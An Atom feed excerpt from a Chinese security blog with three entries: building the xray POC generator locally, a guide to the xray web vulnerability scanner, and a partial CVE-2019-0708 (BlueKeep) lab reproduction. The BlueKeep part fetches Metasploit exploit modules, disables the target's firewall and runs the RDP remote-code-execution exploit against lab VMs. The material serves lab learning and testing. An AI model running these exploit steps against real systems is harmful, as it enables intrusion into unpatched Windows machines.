    <link href="https://www.mad-coding.cn/2019/09/17/%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AApoc%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>https://www.mad-coding.cn/2019/09/17/本地搭建一个poc生成器/</id>
    <published>2019-09-17T09:59:08.000Z</published>
    <updated>2019-09-25T09:28:00.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上意外看到一个在线的<code>poc</code>生成工具，<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">传送门</a>,界面如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180032.png" class="lozad"></p><p>看到网址应该使用<code>GitHub page</code>来生成的，于是条件反射的觉得这个工具应该是开源的，so，复制<a href="https://phith0n.github.io/xray-poc-generation/" target="_blank" rel="noopener">xray-poc-generation</a>到<code>GitHub</code>上搜一下看看，果然，和我猜测的一样，这个工具是开源的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180131.png" class="lozad"></p><p><code>GitHub</code>截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180144.png" class="lozad"></p><h1 id="0x01-编译项目"><a href="#0x01-编译项目" class="headerlink" title="0x01 编译项目"></a>0x01 编译项目</h1><blockquote><p>环境需求：</p><p>Git  <a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">传送门</a></p><p>Node.js <a href="http://nodejs.cn/download/" target="_blank" rel="noopener">传送门</a></p><p>Yarn</p></blockquote><p>安装好<code>Git</code>后，使用<code>git</code>将项目克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/phith0n/xray-poc-generation</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180528.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd xray-poc-generation</span><br><span class="line"></span><br><span class="line">yarn</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180549.png" class="lozad"></p><p>原因：没有安装<code>yarn</code></p><p>使用<code>nmp install -g yarn</code>一键安装</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180601.png" class="lozad"></p><p>然后在使用<code>yarn</code>命令</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180614.png" class="lozad"></p><p>yarn build</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180627.png" class="lozad">    <img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180640.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180655.png" class="lozad"></p><h1 id="0x02-本地搭建"><a href="#0x02-本地搭建" class="headerlink" title="0x02 本地搭建"></a>0x02 本地搭建</h1><blockquote><p>环境需求：</p><p>Windows server 2003</p><p>PHPstudy</p></blockquote><p>将编译好的<code>build</code>文件夹中的内容直接复制到<code>www</code>根目录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180722.png" class="lozad"></p><p>使用<code>ipconfig</code>命令查看<code>Windows server 2003 ip</code>地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180752.png" class="lozad"></p><p>然后使用 <code>http://ip地址</code> 直接访问</p><blockquote><p>注：如果直接将build文件夹复制到www目录下，需要修改index.html的文件，将相对路径改成含build的目录。</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180846.png" class="lozad"></p><h1 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h1><p>【测试数据】</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">poc-yaml-test</span><br><span class="line"></span><br><span class="line">post</span><br><span class="line"></span><br><span class="line">/poc?name=1</span><br><span class="line"></span><br><span class="line">command=&apos;id&apos;</span><br><span class="line"></span><br><span class="line">status == 200 &amp;&amp; body.bcontains(b&apos;test output&apos;)</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190917180916.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天在网上意外看到一个在线的&lt;code&gt;poc&lt;/code&gt;生成工具，&lt;a href=&quot;https:
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="POC" scheme="https://www.mad-coding.cn/tags/POC/"/>
    
  </entry>
  
  <entry>
    <title>XRay-一款好用的漏洞挖掘工具</title>
    <link href="https://www.mad-coding.cn/2019/09/17/XRay-%E4%B8%80%E6%AC%BE%E5%A5%BD%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.mad-coding.cn/2019/09/17/XRay-一款好用的漏洞挖掘工具/</id>
    <published>2019-09-17T07:36:03.000Z</published>
    <updated>2019-09-20T07:34:58.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，netsparker等等。今天给大家介绍一款被动扫描的扫描漏洞的神器——Xray，这款工具我自己用过了，的确挺好用，还能让burpsuite作为下游代理，不耽误测试。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/c2c21aac4effe107" class="lozad"></p><h1 id="0x01-xray简介"><a href="#0x01-xray简介" class="headerlink" title="0x01 xray简介"></a>0x01 xray简介</h1><p>xray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows /macOS / Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。</p><p>下载地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><p>官网地址：<a href="https://chaitin.github.io/xray/#/" target="_blank" rel="noopener">传送门</a></p><p>github地址：<a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">传送门</a></p><blockquote><p>可检测漏洞模块</p><ul><li><p>XSS漏洞检测 (key: xss)</p><p>利用语义分析的方式检测XSS漏洞</p></li><li><p>SQL 注入检测 (key: sqldet)</p><p>支持报错注入、布尔注入和时间盲注等</p></li><li><p>命令/代码注入检测 (key: cmd_injection)</p><p>支持 shell 命令注入、PHP 代码执行、模板注入等</p></li><li><p>目录枚举 (key: dirscan)</p><p>检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件</p></li><li><p>路径穿越检测 (key: path_traversal)</p><p>支持常见平台和编码</p></li><li><p>XML 实体注入检测 (key: xxe)</p><p>支持有回显和反连平台检测</p></li><li><p>poc 管理 (key: phantasm)</p><p>默认内置部分常用的 poc，用户可以根据需要自行构建 poc 并运行。文档：<a href="https://chaitin.github.io/xray/#/guide/poc" target="_blank" rel="noopener">https://chaitin.github.io/xray/#/guide/poc</a></p></li><li><p>文件上传检测 (key: upload)</p><p>支持常见的后端语言</p></li><li><p>弱口令检测 (key: brute_force)</p><p>社区版支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典</p></li><li><p>jsonp 检测 (key: jsonp)</p><p>检测包含敏感信息可以被跨域读取的 jsonp 接口</p></li><li><p>ssrf 检测 (key: ssrf)</p><p>ssrf 检测模块，支持常见的绕过技术和反连平台检测</p></li><li><p>基线检查 (key: baseline)</p><p>检测低 SSL 版本、缺失的或错误添加的 http 头等</p></li><li><p>任意跳转检测 (key: redirect)</p><p>支持 HTML meta 跳转、30x 跳转等</p></li><li><p>CRLF 注入 (key: crlf_injection)</p><p>检测 HTTP 头注入，支持 query、body 等位置的参数</p></li><li><p>..</p></li></ul></blockquote><h1 id="0x02-快速使用"><a href="#0x02-快速使用" class="headerlink" title="0x02 快速使用"></a>0x02 快速使用</h1><p>官网演示：</p><p><img alt="img" data-src="https://camo.githubusercontent.com/8b552644c67728075ef96a2cc56bf15730f21d28/68747470733a2f2f6368616974696e2e6769746875622e696f2f787261792f6173736574732f7465726d2e737667" class="lozad"></p><ol><li><p>使用基础爬虫爬取并对爬虫爬取的链接进行漏洞扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --basic-crawler http://example.com --html-output vuln.html</span><br></pre></td></tr></table></figure><p>不指定输出时，默认输出到控制台的标准输出中,不同参数对应不同的输出方式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#无参数：输出到控制台的标准输出</span></span><br><span class="line">--`text-output`：输出到文本文件中</span><br><span class="line">--`json-output`：输出到 JSON 文件中</span><br><span class="line">--`html-output`：输出到 HTML 文件中</span><br></pre></td></tr></table></figure><p>使用HTTP代理进行被动扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>设置浏览器http代理为<code>http://127.0.0.1:7777</code>，就可以自动分析代理流量并扫描。</p><blockquote><p>如需扫描https流量，请阅读下方文档<code>抓取 https 流量</code>部分</p></blockquote></li><li><p>只扫描单个url，不使用爬虫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b --html-output single-url.html</span><br></pre></td></tr></table></figure></li><li><p>手动指定本次运行的插件</p><p>默认情况下，将会启用所有内置插件，可以使用下列命令指定本次扫描启用的插件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins cmd_injection，sqldet --url http://example.com</span><br><span class="line">xray webscan --plugins cmd_injection，sqldet --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure></li><li><p>指定插件输出</p><p>可以指定将本次扫描的漏洞信息输出到某个文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ ？a = b</span><br><span class="line">--text-output result.txt --json-output result.json --html-output report.html</span><br></pre></td></tr></table></figure><p><a href="https://chaitin.github.io/xray/assets/report_example.html" target="_blank" rel="noopener">报告样例</a></p></li><li><p>运行只单个<strong>内置</strong> POC</p><p>在xray中，所有的pocdency属于插件<code>phantasm</code>，所以使用poc时需要开启<code>phantasm</code>插件才可生效。<code>--poc</code>参数指定本次运行的poc，如不指定，将运行所有的内置poc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce --url http://example.com/</span><br></pre></td></tr></table></figure></li><li><p>运行用户自定义POC</p><p>用户可以按需书写自己的YAML格式的POC，并通过指定<code>--poc</code>参数运行，比如运行在<code>/home/test/1.yaml</code>处的POC。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc /home/test/1.yaml --url http://example.com/</span><br></pre></td></tr></table></figure><p><code>--poc</code> 参数非常灵活，支持Glob匹配，支持从目录加载，可以从以下几个例子理解用法：</p><p>加载<code>/home/test/pocs/</code>所有的POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * ”</span><br></pre></td></tr></table></figure><p>加载<code>/home/test/pocs/</code>下包含thinkphp的POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --plugins phantasm --poc “ / home / test / pocs / * thinkphp * ”</span><br></pre></td></tr></table></figure><p>自定义POC请查看文档。</p></li><li><p>转发漏洞信息到数据库，邮件，IM通知等</p><p>用户可以使用<code>--webhook-output</code>将漏洞信息进行转发，后端需要返回状态200才认为发送成功，否则将打印错误日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan --url http://example.com/ --webhook-output http：// host：port / path</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>ps:如何是Windows的，需要使用xray***.exe文件</p></blockquote><h1 id="0x03-抓取https流量"><a href="#0x03-抓取https流量" class="headerlink" title="0x03  抓取https流量"></a>0x03  抓取https流量</h1><h2 id="3-1-生成证书"><a href="#3-1-生成证书" class="headerlink" title="3.1 生成证书"></a>3.1 生成证书</h2><p>和burp类似，抓取https流量需要信任一个根证书，这个根证书可以自行生成，也可用下列自带的命令生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray genca  <span class="comment">## Linux</span></span><br><span class="line"></span><br><span class="line">xray_windows_amd64.exe genca <span class="comment">##Windows</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142437.png" class="lozad"></p><p>然后xray文件夹下会产生ca证书和ca.key两个文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920142543.png" class="lozad"></p><blockquote><p>Firefox浏览器没有使用系统的根证书管理器，意味着使用Firefox时需要单独在该浏览内导入证书才可生效。对于移动端等，可以在挂代理之后访问<code>http://xray/</code>然后下载根证书。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143319.png" class="lozad"></p></blockquote><p>未安装证书前，提示证书风险，访问https的网站会提示证书风险</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920112843.png" class="lozad"></p><h2 id="3-2-安装证书"><a href="#3-2-安装证书" class="headerlink" title="3.2 安装证书"></a>3.2 安装证书</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143343.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143434.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143442.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143458.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143509.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143531.png" class="lozad"></p><h2 id="3-3-测试"><a href="#3-3-测试" class="headerlink" title="3.3 测试"></a>3.3 测试</h2><p>安装好证书后，重启浏览器，再次访问百度，可以看到没有证书不安全的标志了，说明证书安装成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143558.png" class="lozad"></p><p>碰巧还看到了检测出一个漏洞</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920143609.png" class="lozad"></p><h1 id="0x04-使用技巧"><a href="#0x04-使用技巧" class="headerlink" title="0x04 使用技巧"></a>0x04 使用技巧</h1><h2 id="4-1-常用命令"><a href="#4-1-常用命令" class="headerlink" title="4.1 常用命令"></a>4.1 常用命令</h2><p>虽然在刚刚前面的快速使用中命令有很多种，但是常用的命令就那几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html</span><br></pre></td></tr></table></figure><p>浏览器设置本地代理，以360浏览器为例</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150553.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150614.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150644.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190920150734.png" class="lozad"></p><p>然后通过浏览器手动点击一些页面，xray会自动对这些页面进行测试，非常好用</p><h2 id="4-2-结合burpsuite使用"><a href="#4-2-结合burpsuite使用" class="headerlink" title="4.2 结合burpsuite使用"></a>4.2 结合burpsuite使用</h2><p>burpsuite是个神器是大家公认的，对有很多网站不能使用像AWVS和APPscan这样的大型扫描器来进行测试的，所以只能使用burpsuite来进行手动测试了。在这里如果将burpsuite和xray结合在一起的话，那找漏洞是非常nice的。</p><p><img alt="img" data-src="https://chaitin.github.io/xray/assets/xray-burp-proxy-chain.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p>1、<a href="https://www.anquanke.com/post/id/184204" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184204</a></p><p>2、<a href="https://www.jishuwen.com/d/2TvQ" target="_blank" rel="noopener">https://www.jishuwen.com/d/2TvQ</a></p><p>3、 <a href="https://chaitin.github.io/xray" target="_blank" rel="noopener">https://chaitin.github.io/xray</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在漏洞挖掘中除了手动挖掘，一般都是用一些扫描器开辅助我们去进行测试，比如AWVS,APPSCAN，n
      
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="xray" scheme="https://www.mad-coding.cn/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708复现教程</title>
    <link href="https://www.mad-coding.cn/2019/09/11/CVE-2019-0708%E5%A4%8D%E7%8E%B0%E6%95%99%E7%A8%8B/"/>
    <id>https://www.mad-coding.cn/2019/09/11/CVE-2019-0708复现教程/</id>
    <published>2019-09-11T09:23:28.000Z</published>
    <updated>2019-09-11T10:29:44.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天，随着CVE-2019-0708漏洞EXP的现世，顿时让安全圈躁动起来，大家都通过官网的一些文档教程来自己搭建环境复现漏洞，而菜鸡的我，复现了好久，却久久不能复现成功，今天再次复现，发现了问题的所在，再次献上自己的复现教程，虽然网上教程已经泛滥。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911173741.png" class="lozad"></p><a id="more"></a><h1 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h1><blockquote><p>攻击机：kali Linux 2019.2</p><p>靶机：Windows7 ultimate SP1 </p><p>Windows server 2008 R2标准版</p><p>攻击框架：metasploit</p><p>EXP：cve_2019_0708_bluekeep_rce</p></blockquote><h1 id="0x02-相关文件下载"><a href="#0x02-相关文件下载" class="headerlink" title="0x02 相关文件下载"></a>0x02 相关文件下载</h1><p>CVE-2019-0708 exp下载地址：<a href="https://github.com/mai-lang-chai/CVE-2019-0708-RCE/blob/master/CVE-2019-0708RDPMSF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6.zip" target="_blank" rel="noopener">传送门</a></p><p>Windows7 ultimate SP1下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><p>Windows server 2008 R2标准版下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed2k://|file|cn_windows_server_2008_r2_hpc_edition_with_service_pack_1_x64_dvd_700632.iso|3071051776|7FDEE0F7A49FC63148D4DE580D803742|/</span><br></pre></td></tr></table></figure><h1 id="0x03-开搞"><a href="#0x03-开搞" class="headerlink" title="0x03 开搞"></a>0x03 开搞</h1><h2 id="3-1-跟新metasploit框架"><a href="#3-1-跟新metasploit框架" class="headerlink" title="3.1 跟新metasploit框架"></a>3.1 跟新metasploit框架</h2><p>首先需要跟新到最新的metasploit框架，版本是5.0.47版本</p><p>跟新命令脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure><p>跟新完成的版本截图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174035.png" class="lozad"></p><p>跟新后可能会出现如下两个问题</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174058.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174146.png" class="lozad"></p><p>意思是没有启动带数据库支持的MSF服务需要我们去启动，其实这对于复现漏洞没有影响，就是看着难受</p><p>【解决方法】</p><p>我们使用<code>exit</code>退出<code>msfconsole</code>,然后输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure><p>输入完成后等待显示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174310.png" class="lozad"></p><p>这个字样在输入：msfdb init</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174325.png" class="lozad"></p><p>再次输入msfconsole，问题解决</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911174344.png" class="lozad"></p><h2 id="3-2-替换exp文件"><a href="#3-2-替换exp文件" class="headerlink" title="3.2 替换exp文件"></a>3.2 替换exp文件</h2><p>首先需要下载0708的exp文件，这个文件在前面以及分享过了，也可以利用wget命令直接下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line"></span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p> 然后，进入刚刚下载的exp的目录，然后使用下面命令替换原来的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line"></span><br><span class="line">cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line"></span><br><span class="line">mkdir /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp  <span class="comment">##创建rdp目录</span></span><br><span class="line"></span><br><span class="line">cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><h2 id="3-3-开始复现"><a href="#3-3-开始复现" class="headerlink" title="3.3 开始复现"></a>3.3 开始复现</h2><h3 id="3-3-1-Windows-7-x64-sp1配置"><a href="#3-3-1-Windows-7-x64-sp1配置" class="headerlink" title="3.3.1 Windows 7 x64 sp1配置"></a>3.3.1 Windows 7 x64 sp1配置</h3><p>第一步：关闭防火墙</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175304.png" class="lozad"></p><p><img alt="1568195617145" data-src="C:%5CUsers%5C10367%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568195617145.png" class="lozad"></p><p>第二步：开启3389远程</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175410.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175444.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911175542.png" class="lozad"></p><h3 id="3-3-2使用的命令"><a href="#3-3-2使用的命令" class="headerlink" title="3.3.2使用的命令"></a>3.3.2使用的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment">##进入metasploit框架</span></span><br><span class="line">reload_all <span class="comment">##重新载入漏洞模块</span></span><br><span class="line">search 0708 <span class="comment">##搜索0708的漏洞</span></span><br><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep _rce  <span class="comment">##0708RDP攻击模块</span></span><br><span class="line">info  <span class="comment">##查看漏洞的相关信息</span></span><br><span class="line">show options <span class="comment">##查看需要设置的参数</span></span><br><span class="line"><span class="built_in">set</span> rhosts <span class="comment">##靶机ip ##设置需要攻击的靶机ip地址</span></span><br><span class="line">show targets  <span class="comment">##显示可以攻击的靶机类型</span></span><br><span class="line"><span class="built_in">set</span> target 数字 <span class="comment">##设置攻击的靶机类型</span></span><br><span class="line">exploit <span class="comment">##开始利用</span></span><br></pre></td></tr></table></figure><blockquote><p>msfconsole</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180426.png" class="lozad"></p><blockquote><p>reload_all</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180514.png" class="lozad"></p><blockquote><p>search 0708</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190911180532.png" class="lozad"></p><blockquote><p>info</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 